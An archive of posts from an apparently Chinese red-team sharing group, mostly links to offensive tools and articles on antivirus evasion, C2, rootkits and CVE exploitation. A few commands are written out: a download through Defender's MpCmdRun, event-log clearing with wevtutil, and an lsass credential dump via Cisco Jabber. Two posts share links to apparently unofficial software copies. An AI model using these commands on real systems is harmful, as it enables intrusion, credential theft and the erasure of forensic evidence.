 `#防狼喷雾#` <br>点开第二个抓包看看?


# RedTeaming - 2020-09-02
外网渗透技巧<br>蚁剑Jsp一句话，支持内存马。可以看下他的其他项目。<br><br>[GitHub+-+yzddmr6/JspForAntSword:+中国蚁剑JSP一句话Payload](https://github.com/yzddmr6/JspForAntSword)


# RedTeaming - 2020-09-02
[Malleable-C2-Profiles配置](https://mp.weixin.qq.com/s/d-ypGfoevjOz-VP0-dIVRg)


# RedTeaming - 2020-09-02
傀儡进程优化-武器化利用<br>[http://8sec.cc/index.php/archives/419/](http://8sec.cc/index.php/archives/419/)<br><br><br><br><br><br>密码加入星球后查看
![](https://images.zsxq.com/Fluv5eMhId5MEUcCVjpBct9EPV-o?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:_chPkXkElyHbf2w0wB2rWdc4qS0=)

# RedTeaming - 2020-09-03
 `#黑果折腾记#` 

```
Wing: 大一的时候安炸了，最后 80 块钱找淘宝安。
Evi1oX: 你这还不算踩坑，坑大多在 DSDT 和 SSDT, 最后发现有这时间还不如买个🍎
L: 没钱，中低配不如黑苹果。高配上 w 买不起，我要有钱我早买了。可惜我不是后浪🐸
```
# RedTeaming - 2020-09-03
You can use C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2008.9-0\MpCmdRun.exe -url <url> -path <local-path> to download your file using Windows defender itself.

```
裤衩哥: 有的版本成功了，有的没有，未开启 wd 这个 mpcmdrun 不再 programdata 中在其他文件夹
lengyi: 是的
L: Defender 关了是不是不能成功 [撇嘴]
裤衩哥: 好像是特定版本才能触发，存在的好像都可以
```
# RedTeaming - 2020-09-03
`#免杀技巧#` <br>整那么多花里胡哨的,直接加个壳.<br>[Release+ConfuserEx+1.4.1+·+mkaring/ConfuserEx+·+Gi...](https://github.com/mkaring/ConfuserEx/releases/tag/v1.4.1)
![](https://images.zsxq.com/Fvv_JvRBSrs_kOXhlc3SetBbJGp3?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:KS87biDYofoOgMz02OJRixyGAxw=)
![](https://images.zsxq.com/Fuw7UE21q1WqQe44xaXMb4mN0x96?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:dcFuo9ivzTjVEaQuaMIG0FvecOY=)
```
裤衩哥: 赛门那个你运行下 [皱眉]，火绒和赛门静态都一般加壳好过，360 是加壳就被杀
裤衩哥: 去给我分享的那个点个赞😷
Wing: 傀儡进程那个？
裤衩哥: 是啊
crazyman: 这个不算壳啊
Wing: 反正我看不懂 (◎_◎;)
裤衩哥: 我不管我不管 [机智]
H01k: 算啊
```
# RedTeaming - 2020-09-03
`#免杀技巧#` <br>整那么多花里胡哨的,直接加个壳.<br>[Release+ConfuserEx+1.4.1+·+mkaring/ConfuserEx+·+Gi...](https://github.com/mkaring/ConfuserEx/releases/tag/v1.4.1)
![](https://images.zsxq.com/Fvv_JvRBSrs_kOXhlc3SetBbJGp3?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:KS87biDYofoOgMz02OJRixyGAxw=)
![](https://images.zsxq.com/Fuw7UE21q1WqQe44xaXMb4mN0x96?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:dcFuo9ivzTjVEaQuaMIG0FvecOY=)
```
裤衩哥: 赛门那个你运行下 [皱眉]，火绒和赛门静态都一般加壳好过，360 是加壳就被杀
裤衩哥: 去给我分享的那个点个赞😷
Wing: 傀儡进程那个？
裤衩哥: 是啊
crazyman: 这个不算壳啊
Wing: 反正我看不懂 (◎_◎;)
裤衩哥: 我不管我不管 [机智]
H01k: 算啊
```
# RedTeaming - 2020-09-03
`#免杀技巧#` <br>狗贼404 Star的项目,一些壳的整理.<br>[GitHub+-+NotPrab/.NET-Obfuscator:+Lists+of+.NET+Ob...](https://github.com/NotPrab/.NET-Obfuscator)


# RedTeaming - 2020-09-04
`#外网渗透技巧#` <br>刚看到三个DNSLOG平台<br>[GitHub+-+Buzz2d0/Hyuga:+Hyuga+is+a+monitoring+tool...](https://github.com/Buzz2d0/Hyuga)<br>[DNSLOG.PRO+API](https://dnslog.pro/api.php)<br>[GitHub+-+chennqqi/godnslog:+An+exquisite+dns&http+...](https://github.com/chennqqi/godnslog)<br><br>懂的都懂
![](https://images.zsxq.com/Fn5D4hIoWjk_GCiiHcwgowLPLDYn?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:zyQCwEfq0-Gae99tO1wURj4VI9I=)
```
Wing: 不知道登录密码的自己看源码
```
# RedTeaming - 2020-09-04
`#外网渗透技巧#` <br>细数 redis 的几种 getshell 方法<br><br>[细数+redis+的几种+getshell+方法+-+浅蓝+'s+blog](https://b1ue.cn/archives/318.html)


# RedTeaming - 2020-09-04
`#日常技巧#` <br>zsh下git的一些快捷指令<br>gcl<br>gaa<br>ga<br>gcm<br>[zsh+下+git+别名（alias）+和+oh-my-zsh+git+插件的故事+-+hello,...](https://segmentfault.com/a/1190000007059404)


# RedTeaming - 2020-09-04
数字签名的幺蛾子(数字签名那些事-2)-微软证书漏洞 CVE-2020-0601原理分析与复现<br><br>[数字签名的幺蛾子(数字签名那些事-2)-微软证书漏洞+CVE-2020-0601原理分析与复现+-+...](http://8sec.cc/index.php/archives/420/)<br><br>只恨当初离散挂科。
![](https://images.zsxq.com/FkyWLLvZ952LRr2PkTtiIIakOjYK?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:3FrcuaMV_4NxeaN_w-8axpiyqwI=)
```
裤衩哥: 交出你们手里的赞
Wing: 免杀没问题吧。
裤衩哥: 看杀软，
crazyman: 不行
lengyi: 免杀不行，我之前也搞过这个
裤衩哥: [撇嘴][撇嘴] 有时候还是管用的，得看杀软，国外的基本都不行
lengyi: 这个得在有漏洞的时候才管用吧
裤衩哥: 对的啊
```
# RedTeaming - 2020-09-04
昨天测 MpCmdRun 的表哥，还好吧 [捂脸]
![](https://images.zsxq.com/FuZ1-BciPvjpZbhgOvnXIg7lOXO4?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:34iv84NL2nCci0mbn8TFXt1Jshg=)
```
crazyman: 这太草了
Patrilic: 笑出声
```
# RedTeaming - 2020-09-06
蚁剑改造计划之支持内存马 <br> 没什么技术含量，记录一下更新的细节


# RedTeaming - 2020-09-06
`#安全开发#` <br>.Net Core后台脚手架,ANTD,最香的前端框架.<br>[GitHub+-+Coldairarrow/Colder.Admin.AntdVue:+Admin+...](https://github.com/Coldairarrow/Colder.Admin.AntdVue)


# RedTeaming - 2020-09-06
`#安全开发#` <br>学了几天React,实在受不了,还是Vue香.<br>学react主要也是为了ANTD,因为官方的就是React版本,支持的比较多.<br>[GitHub+-+iczer/vue-antd-admin:+🐜+Ant+Design+Pro's+...](https://github.com/iczer/vue-antd-admin)


# RedTeaming - 2020-09-06
[Bypass+Windows+Defender+Reverse+Shell](https://mp.weixin.qq.com/s/dOsZRDNAw47g3xQMbLI89w)


# RedTeaming - 2020-09-06
`#红队技巧#`   `#内网渗透#`  <br><br>[Lateral+Movement之WMI事件订阅](https://mp.weixin.qq.com/s/bb_pn1Gk3DUysZ536q77-w)


# RedTeaming - 2020-09-09
`#漏洞利用#` <br>CVE-2020-16875: Microsoft Exchange远程代码执行漏洞通告<br>9.1的评分,貌似可以用过发送邮件触发.<br>[CVE-2020-16875:+Microsoft+Exchange远程代码执行漏洞通告+-+360...](https://cert.360.cn/warning/detail?id=b5e0e30d8a1f3652048a84017fb881b7)

```
-: 要是有 exp 就好了
```
# RedTeaming - 2020-09-09
`#外网渗透技巧#` <br>[GitHub+-+j3ers3/Dirscan:+🎃+目录扫描工具+Dirscan+，A+simpl...](https://github.com/j3ers3/Dirscan)<br>我觉得还可以

```
z3r0yu: 感觉字典还可以，copy 走了
```
# RedTeaming - 2020-09-09
`#windows 10 COM BUG#` <br>[2051+-+project-zero+-+Project+Zero+-+Monorail](https://bugs.chromium.org/p/project-zero/issues/detail?id=2051)
![](https://images.zsxq.com/Fr5QH9rcVyYl0iB34JJxXUeOLKd9?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:E20qtBSykmAZaDqrALV4DyV5jL0=)
![](https://images.zsxq.com/FuHHxVhaTJ-CAdymuYEaZ-1N9ezE?e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:3L8gXhxUeZMPJ-WBk0QM7E68yD8=)
![](https://images.zsxq.com/FqtS3xlU7pLA0h-t1i6VNnQvh032?e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:pRbYI-Jthh2C589JF4KCI3C8IVI=)
![](https://images.zsxq.com/FllLOjR9Y0RXksjhQs367GFCWkVR?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:8RNdcDNZxJcsaU2g0ZfmmjHmM2Q=)
```
Wing: 我以为我复现失败了，报错。为啥是宋冬
L: 不知道，好像那个接口创建的用户就叫这个 [捂脸]
Wing: 醉了。我以为我那台虚拟机本来就存在一个叫宋冬的用户。
lengyi: exp 开发中。
```
# RedTeaming - 2020-09-09
`#内网渗透技巧#` <br><br>[Windows+入侵痕迹清理技巧](https://mp.weixin.qq.com/s/uX6Nt6bzGsDOLsRsaXgogg)

```
L: wevtutil 清除也是可以的 <br>wevtutil cl System<br>wevtutil cl Application<br>wevtutil cl Security<br>wevtutil cl Setup
```
# RedTeaming - 2020-09-10
[反转字符串绕杀软](https://mp.weixin.qq.com/s/zsqUc8YO99Y3EzgOIG9mNA)


# RedTeaming - 2020-09-12
微软Exchange Server远程代码执行（CVE-2020-16875）<br><br>检测是否存在漏洞：<br>[GitHub+-+dpaulson45/HealthChecker:+Exchange+Server...](https://github.com/dpaulson45/HealthChecker)<br><br>检测思路（日志）：<br>Events ID 25552 (New-DlpPolicy) <br>[Exchange+Admin+Audit+Log+Event+ID+25552+-+New-DlpP...](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=25552)<br><br>Event ID 25546 ( mport-DlpPolicyTemplate)<br>[Exchange+Admin+Audit+Log+Event+ID+25546+-+Import-D...](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=25546)<br><br>来源：<br>[https://twitter.com/TomSellers/status/130412597100...](https://twitter.com/TomSellers/status/1304125971000446981)<br><br>技术分析：<br>[AttackerKB+|+CVE-2020-16875](https://attackerkb.com/topics/Y2azzfAbid/cve-2020-16875?#rapid7-analysis)


# RedTeaming - 2020-09-13
`#淦#`  <br>虚拟机逃逸<br><br>[安恒安全运营中心威胁情报总结+DAY1](https://mp.weixin.qq.com/s/kvMtYtCX3LU5yus1Pc59Ww)


# RedTeaming - 2020-09-16
`#漏洞复现#` <br>CVE-2020-1472复现:[CVE-2020-1472复现+|+九世的博客](https://422926799.github.io/posts/b2a3f021.html)

```
Wing: 猕猴桃已经支持了
```
# RedTeaming - 2020-09-16
`#漏洞复现#` <br>CVE-2020-1472复现:[CVE-2020-1472复现+|+九世的博客](https://422926799.github.io/posts/b2a3f021.html)

```
Wing: 猕猴桃已经支持了
```
# RedTeaming - 2020-09-16
`#内网漏洞利用#`  <br>CS版本的CVE-2020-1472<br><br>[nccfsas/Tools/SharpZeroLogon+at+main+·+nccgroup/nc...](https://github.com/nccgroup/nccfsas/tree/main/Tools/SharpZeroLogon)<br><br>[nccfsas/Tools/SharpZeroLogon+at+main+·+nccgroup/nc...](https://github.com/nccgroup/nccfsas/tree/main/Tools/SharpZeroLogon)

```
Tony: 看到 cs 版本的，下意识以为是 cobalt strike 插件，打开一下是 c#
Wing: execute-assembly
```
# RedTeaming - 2020-09-17
`#碎碎念#` <br><br>[记一次小溯源+-+先知社区](https://xz.aliyun.com/t/8300)


# RedTeaming - 2020-09-17
离谱！<br><br>[C404+Indictment+Reduced+Size](http://www.documentcloud.org/documents/7209586-C404-Indictment-Reduced-Size.html)

```
Wing: @404的菜鸡徒弟
```
# RedTeaming - 2020-09-17
## Question:
有没有二开 cobaltstrike 的资料？丢点

## Answer:
还没下班呢，日  后再说。[旺柴]


# RedTeaming - 2020-09-18
## Question:
想问师傅们 对于 C2 和 MSF 如何学习才是最好的方式 <br><br> 还有很多东西是否要钻牛角尖深究它的原理 <br><br> 以及免杀，需要怎么去入门，需要哪些基础呢

## Answer:
C2 和 msf 的学习：本地手动搭建一个域环境，设置三层内网。至少先保证能够使用他们打到最后一层（域控）<br><br> 关于免杀：高级免杀我还在学习，基础的就去 ired.team 学习。<br><br> 我觉得吧，任何人的回答都没啥用，多琢磨，带着有用的问题去讨论，提问。


# RedTeaming - 2020-09-23
[使用yara防御恶意软件](https://mp.weixin.qq.com/s/cyAzSUoUvSw3XrAqcQs0sw)


# RedTeaming - 2020-09-24
`#外网渗透技巧#` <br><br>[Shiro+组件安全概览](https://mp.weixin.qq.com/s/NSEwb-K2NuhoFMVkVtFxDA)


# RedTeaming - 2020-09-25
`#碎碎念#`  <br>团队协同作战才能所向披靡<br><br>[红蓝攻防实战演习复盘总结（附脑图下载地址）](https://mp.weixin.qq.com/s/fziXRNrWLzQhJJJNUnRS5Q)


# RedTeaming - 2020-09-26
红队隐藏技巧<br><br><br>[红队隐藏技巧+-+裤衩哥的小屋](http://8sec.cc/index.php/archives/426/)


# RedTeaming - 2020-09-27
 `#Linux权限维持#` <br>Snake窃取密码
![](https://images.zsxq.com/Fk2kBI9Ww-IY-c5X8wD9wU0zWk82?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:kKV9Q0djQ1A1mUo3V_qpGeO5BTs=)

# RedTeaming - 2020-09-27
`#C2#`  <br>这个实战中还没用过，用过的同学可以反馈下效果咋样。Linux版本的C2 Go语言写的开源的有好几个了。核心功能就是要支持s5/http代理，大家可以尝试用一下blueshell和DeimosC2 。<br><br>[热门极速下载/CrossC2](https://gitee.com/mirrors_trending/CrossC2)

```
lengyi: 这个支持 mac，安卓，新加入了横向移动
```
# RedTeaming - 2020-09-27
`#红队武器化研发#`  <br>如果想写自己的自动化工具的话，可以把里面的函数抽离出来用，老夫写代码就是复制粘贴。<br>Environment<br>•	CurrentUser.cs - the current user<br>•	DomainName.cs - the domain name<br>•	HostName.cs - the hostname<br>•	LoggedOnUsers.cs - List all logged on users<br>•	OSVersion.cs - OS version information<br>•	VirtualEnvironment.cs - Checks if we are operating in a virtualised environment<br>•	userEnvironmentVariables.cs - Grabs the environment variables applied to the current process<br>•	SystemEnvironmentVariables.cs - Grabs system environment variables from the registry (HKLM)<br>•	NameServers.cs - Gets the DNS servers for each network interface<br>Defences<br>•	AVProcesses.cs - Checks if any known AV processes are running<br>………<br>………<br><br>[GitHub+-+mdsecactivebreach/sitrep](https://github.com/mdsecactivebreach/sitrep)


# RedTeaming - 2020-09-29
`#内网渗透技巧#`   `#Go#`   `#武器化开发#` <br>dump浏览器敏感信息
![](https://images.zsxq.com/FjHYHS7DfKLfRMNgINRg7zkgHrQ8?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:eWM1Mx2J5D5IL_pHT9GWJ4M0FcQ=)
![](https://images.zsxq.com/Fr3crdX1a1SKL7DukxmpFbpihlKN?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:EgCKL3n_zGLaXewkHmizHIulJQk=)
```
Wing: 我想说我们每一个人哪天被黑了自己肯定是不知道的，未知最可怕.
```
# RedTeaming - 2020-09-29
`#外网渗透技巧#`  <br>🐮🍺<br><br>[极限环境Certutil加Powershell配合Burp快速落地文件](https://mp.weixin.qq.com/s/f7sOjXjkbg3KFSJgXc1jPQ)


# RedTeaming - 2020-09-29
`#内网渗透技巧#` <br><br>[域渗透——使用MachineAccount实现DCSync](https://mp.weixin.qq.com/s/DJ-ymALN3lvP43g7ZCgUFA)


# RedTeaming - 2020-09-29
 `#内网渗透技巧#`  <br>Cisco Jabber dump lsass<br><br>cd c:\program files (x86)\cisco systems\cisco jabber\x64\<br>processdump.exe (ps lsass).id c:\temp\lsass.dmp


# RedTeaming - 2020-09-30
#CompatTelRunner.exe权限提升#<br>[Abusing+Windows+Telemetry+for+Persistence+|+Truste...](https://www.trustedsec.com/blog/abusing-windows-telemetry-for-persistence/?utm_content=131234033)
![](https://images.zsxq.com/Fo-T29HE1U2rby2teAqMEVFfsEvX?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:tL_VPgt8Wv_NiGPv3KexshfdJyg=)
![](https://images.zsxq.com/FsTaeRVhnchTAS-fB8s8tHxkjp8M?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:OxZG_1yFPTo9Y43JRt5kH4TiFnc=)

# RedTeaming - 2020-09-30
`#碎碎念#` <br>Docker 清理卫士<br><br>[Docker+清理卫士+|+knarfeh's+logbook](https://knarfeh.com/2017/12/15/Docker%20%E6%B8%85%E7%90%86%E5%8D%AB%E5%A3%AB/)


# RedTeaming - 2020-09-30
[Rootkit+for+AppInit_DLLs+-+裤衩哥的小屋](http://8sec.cc/index.php/archives/429/)<br><br>Rootkit for AppInit_DLLs<br><br>老东西了，就是最近看到r77-rootkit瞅了眼代码，C重新实现了下。

```
Wing: 能过 360 我就用。[旺柴]
裤衩哥: 我不管，反正我能过。
```
# RedTeaming - 2020-09-30
[Rootkit+for+AppInit_DLLs+-+裤衩哥的小屋](http://8sec.cc/index.php/archives/429/)<br><br>Rootkit for AppInit_DLLs<br><br>老东西了，就是最近看到r77-rootkit瞅了眼代码，C重新实现了下。

```
Wing: 能过 360 我就用。[旺柴]
裤衩哥: 我不管，反正我能过。
```
# RedTeaming - 2020-10-01
[幽冥地府管理系统](http://www.youmingdifu.com/)

```
Black cher*: 。。。有没有阳间的管理系统
```
# RedTeaming - 2020-10-01
转自御剑：<br>链接：[https://pan.baidu.com/s/1q6HP29k007AK5fOWkb8Srg](https://pan.baidu.com/s/1q6HP29k007AK5fOWkb8Srg) <br>提取码：KcG3


# RedTeaming - 2020-10-01
 `#BypassAV#`  #内网渗透技巧
![](https://images.zsxq.com/Fv0tuEeCYY_lYubZzi0ViyjC-JlZ?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:Bjt5VqkC1aJXbnU5gq00v4m1PHA=)

# RedTeaming - 2020-10-01
利用OPENVPN配置文件进行反制<br><br>[安全技术|利用OpenVpn配置文件反制的武器化探索+-+先知社区](https://xz.aliyun.com/t/8289)


# RedTeaming - 2020-10-03
`#自动化#` <br><br>[GitHub+-+PaytmLabs/nerve:+NERVE+Continuous+Vulnera...](https://github.com/PaytmLabs/nerve)
![](https://images.zsxq.com/FsLBPcHl3UfpbohFZiEYVSoL77YV?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:GJ2YMlGUGf_1eECD6wpv9hM3whQ=)

# RedTeaming - 2020-10-03
`#钓鱼攻击#`  <br>自动化通过unicode构造相似域名，可以通过vt查询该域名是否被加入恶意C2。<br><br>[uriDeep+-+Unicode+Encoding+Attacks+With+Machine+Le...](https://www.kitploit.com/2020/10/urideep-unicode-encoding-attacks-with.html?m=1)


# RedTeaming - 2020-10-03
`#CSTips#`   `#内网渗透技巧#` <br><br>[Cobalt+Strike+绕过流量审计](https://paper.seebug.org/1349/)


# RedTeaming - 2020-10-05
Av绕过<br><br>[Defeat+Bitdefender+total+security+using+windows+AP...](https://shells.systems/defeat-bitdefender-total-security-using-windows-api-unhooking-to-perform-process-injection/)


# RedTeaming - 2020-10-05
`#免杀#`   `#内网渗透技巧#` <br><br>[免杀技巧-执行系统命令方式总结](https://mp.weixin.qq.com/s?srcid=1004hhII5js44KEL9CgdRmEe&scene=23&sharer_sharetime=1601822770962&mid=2247485046&sharer_shareid=2bfea3a1914646ead630f87d9dbd3069&sn=51c98ac8f1e61a667ec3dfaf72155bfd&idx=1&__biz=Mzg2NjQ2NzU3Ng%3D%3D&chksm=ce4b2de1f93ca4f79ba561decfeee3514c1f43c5751832c8e5c1073d6dc8a0e582706b52741c&mpshare=1#rd)


# RedTeaming - 2020-10-06
#windows 10 bypass UAC技巧#<br>[https://swapcontext.blogspot.com/2020/10/uacme-35-...](https://swapcontext.blogspot.com/2020/10/uacme-35-wd-and-ways-of-mitigation.html?m=1)<br><br>最真实的图
![](https://images.zsxq.com/FrI1rw-vX31c3AGzcBnJjVTNY-RX?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:f85-jEgprpv8lAQDp8oPmSC_yz4=)

# RedTeaming - 2020-10-08
`#内网渗透技巧#` <br><br>[MSSQL一种新的DNS带外的方式](https://mp.weixin.qq.com/s/NtGJhYn3bL9YFmTqmdObVg)


# RedTeaming - 2020-10-08
bypasuac研究：[bypass+UAC研究+|+九世的博客](https://422926799.github.io/posts/70084607.html)


# RedTeaming - 2020-10-09
`#免杀#`   `#武器化开发#`  <br>针对WD的特征码自动识别<br>[GitHub+-+rasta-mouse/ThreatCheck:+Identifies+the+b...](https://github.com/rasta-mouse/ThreatCheck)


# RedTeaming - 2020-10-09
`#外网渗透技巧#` <br>sourmap 还原<br>[GitHub+-+rarecoil/unwebpack-sourcemap:+Extract+unc...](https://github.com/rarecoil/unwebpack-sourcemap)


# RedTeaming - 2020-10-10
`#自动化#`  <br>指纹库<br>[GitHub+-+webanalyzer/rules:+通用的指纹识别规则](https://github.com/webanalyzer/rules)


# RedTeaming - 2020-10-11
 `#碎碎念#`  <br>希望大家活跃讨论和分享，主要是讨论，分享的再多东西也需要能够在实战中体现出来才行。活跃的师傅会成为嘉宾。

```
裤衩哥: 也就是要把思路和分享的东西武器化
Wing: 武器化要成体系，没有团队协作会很困难。
Wing: 缺什么要列出来。
裤衩哥: 实现到需要的时候就能好用针对不同情况能够有用
lengyi: 这需要时间与协作
```
# RedTeaming - 2020-10-13
一些403bypass的tips<br><br>[HowToHunt/403Bypass.md+at+master+·+KathanP19/HowTo...](https://github.com/KathanP19/HowToHunt/blob/master/Status_Code_Bypass/403Bypass.md)


# RedTeaming - 2020-10-14
发现了一个比较好玩的项目，更改IAT的一个东东，这个东西有啥用呢，在之前mimikatz的免杀哪里其实就已经说的很明白了，之前我也用过这种方法绕过过windows dedfender对mimikatz的查杀，那么这个项目也就是利用更改IAT来实现一些绕过效果，比如我下面的例子，就是一个基础的进程注入，而如火绒等，都会查杀如CreateRemoteThread之类的函数，这也是一个不错的绕过方法。<br><br>附上地址：[GitHub+-+d35ha/CallObfuscator:+Obfuscate+specific+...](https://github.com/d35ha/CallObfuscator)<br><br> `#红队技巧#`   `#免杀#`   `#bypassAV #`   `#Mimikatz#` 
![](https://images.zsxq.com/FtSg9dBjPBPIdiHJPDDwIjqbwTjo?e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:fPzTZvI1oJftm7TDkVFDl4TeBBg=)
![](https://images.zsxq.com/Fl8OEs3jqeDJqcngcjCJWpobFPsi?e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:yhPv1e_H-A-eX8ORgECGauFQxH4=)
![](https://images.zsxq.com/FvkmUzjWHFNAiseBON__kc9iQ-5a?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:uQ0ikzCnDoUVEStrV-Gnr62ETPQ=)
![](https://images.zsxq.com/Fo3-44BCAdPw0AVW8IqyRZVmCADf?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:k7RSkWu7dnLIn9zwkGT1ZJqueb4=)
![](https://images.zsxq.com/FhTVB65V1q8ja7636d33SXOl9FSP?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:o1M66Phc6UkekGUYevEhBZr_n0Q=)
```
裤衩哥: 最后一图的分析工具是什么啊 [发呆]
lengyi: Peatudio
lengyi: pestudio
裤衩哥: okok，谢谢
Wing: 微步的分析会上传吗
lengyi: 不清楚，。
裤衩哥: 感觉好像会。。
Wing: 那用毛微步。
```
# RedTeaming - 2020-10-17
C语言-让注入进行到底<br><br>[C语言-让注入进行到底+-+裤衩哥的小屋](http://8sec.cc/index.php/archives/432/)<br><br>RWXHunter学习记录


# RedTeaming - 2020-10-17
C语言-让注入进行到底<br><br>[C语言-让注入进行到底+-+裤衩哥的小屋](http://8sec.cc/index.php/archives/432/)<br><br>RWXHunter学习记录


# RedTeaming - 2020-10-17
`#红队技巧#`  <br>演练前借一台新电脑，需要什么东西统一存在ecs，只要别在电脑上乱安攻击过程中遇到的东西，上线率还是比较低的，以及说你去连别人3389啥的，尽量也用ecs。<br>有可能我们自己的电脑现在“在线”<br><br>[攻防演练中防守方的骚姿势](https://mp.weixin.qq.com/s/4JNNxQOHyhtbxaRrCSApGQ)

```
裤衩哥: 服务别乱安，不懂运维就千万别乱装东西。chmod777 也别乱给 [流汗]
Wing: 没法防 0day
裤衩哥: 0day 去打个溯源的 多余了
```
# RedTeaming - 2020-10-18
师傅们轻喷<br><br>[工具开源--远程dump+lsass进程并远程上传](https://mp.weixin.qq.com/s/xgQnKbz-43Dme56ta7eKjQ)

```
裤衩哥: 得学下 syscall 是咋回事了，[撇嘴] 去年放到 todo 到现在都还没看
lengyi: [撇嘴][撇嘴] 我在研究横向渗透绕过杀软的方法，太难了。。
```
# RedTeaming - 2020-10-20
`#Mac工具#`  <br>Mac PD16<br>闲鱼买的<br>复制这段内容后打开百度网盘手机App，操作更方便哦<br>链接：[https://pan.baidu.com/s/1NazJEWWHYtmEG4_FkMBfOQ](https://pan.baidu.com/s/1NazJEWWHYtmEG4_FkMBfOQ) <br>提取码：6uJ4

```
z3r0yu: 感觉 16 用起来风扇呼呼的，你的有这个现象吗？
```
# RedTeaming - 2020-10-26
`#红队武器化研发#`  <br>[GitHub+-+gitjdm/dumper2020:+Yet+another+LSASS+dump...](https://github.com/gitjdm/dumper2020)<br><br>dumpert的完善，自己注意编译细节。<br><br>[GitHub+-+gitjdm/dumper2020:+Yet+another+LSASS+dump...](https://github.com/gitjdm/dumper2020)


# RedTeaming - 2020-10-26
`#Mac#`  <br>VmwareFusion12<br>完美适配MacOS BigSur<br>复制这段内容后打开百度网盘手机App，操作更方便哦<br>链接：[https://pan.baidu.com/s/1prJCTcZEoSyqlIfUREB0Eg](https://pan.baidu.com/s/1prJCTcZEoSyqlIfUREB0Eg) <br>提取码：V17n --来自百度网盘超级会员V5的分享


# RedTeaming - 2020-10-26
`#CSTips#` <br><br>[GitHub+-+Gality369/CS-Loader:+CS免杀](https://github.com/Gality369/CS-Loader)


# RedTeaming - 2020-10-26
`#内网渗透技巧#`  <br>Code execution via the Windows Update client (wuauclt)<br><br>[Code+execution+via+the+Windows+Update+client+(wuau...](https://dtm.uk/wuauclt/)
![](https://images.zsxq.com/FmRbznQwQAIkxpGU65oODqp2L4ae?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:E49jAQOqyCxh57eAmoOcT6wRFi4=)

# RedTeaming - 2020-10-26
`#碎碎念#` <br>Github加速下载<br>[GitHub+文件加速](https://curl.oeo.workers.dev/)


# RedTeaming - 2020-10-27
`#外网渗透技巧#`  <br>常见的基本也就这些了<br><br>[看图识WAF-搜集常见WAF拦截页面](https://mp.weixin.qq.com/s/ozOfOEnj6RrvX-KkfdcCQA)

```
RBPi: 谢谢 Wing
```
# RedTeaming - 2020-10-27
CrossC2 继续更新了


# RedTeaming - 2020-10-27
`#没啥用的Tips#` <br>利用github action自动签到<br>[T00LS+|+低调求发展+-+潜心习安全](https://www.t00ls.net/thread-58439-1-1.html)


# RedTeaming - 2020-10-28
